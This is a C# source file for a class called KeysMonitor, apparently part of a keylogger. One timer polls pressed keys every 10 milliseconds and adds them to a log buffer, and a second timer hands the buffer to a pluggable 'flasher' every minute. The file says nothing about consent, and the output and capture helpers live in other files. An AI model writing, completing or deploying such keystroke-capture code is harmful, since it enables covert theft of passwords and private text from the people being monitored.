using wls.Buffer;

namespace wls
{
    public class KeysMonitor
    {
        private readonly System.Timers.Timer _timerKeyMine;
        private readonly System.Timers.Timer _timerBufferFlash;

        private readonly LogBuffer _logBuffer;
        private readonly IFlash _flasher;        

        public KeysMonitor(IFlash flasher, IBufferProcessor bufferProcessor)
        {
            _flasher = flasher;
            _logBuffer = new LogBuffer(bufferProcessor);

            _timerKeyMine = new System.Timers.Timer();
            _timerKeyMine.Elapsed += TimerKeyMineElapsed;
            _timerKeyMine.Interval = 10;
            
            _timerBufferFlash = new System.Timers.Timer();
            _timerBufferFlash.Elapsed += TimerBufferFlashElapsed;
            _timerBufferFlash.Interval = 1000*60; //Flash buffer every minute by default
            
            _timerBufferFlash.Enabled = true;
            _timerKeyMine.Enabled = true;            
        }

        public double FlashInterval
        {
            get { return _timerBufferFlash.Interval; }
            set { _timerBufferFlash.Interval = value; }
        }

        public bool Enabled
        {
            get { return _timerKeyMine.Enabled; }            
        }

        public void Start()
        {
            _timerKeyMine.Enabled = true;
            _timerBufferFlash.Enabled = true;
        }

        public void Stop()
        {
            _timerKeyMine.Enabled = false;
            _timerBufferFlash.Enabled = false;
        }

        private void TimerKeyMineElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            _logBuffer.Add(KbApiWrapper.KeysPressed());
        }

        private void TimerBufferFlashElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            _flasher.Flash(_logBuffer);
        }

    }
}
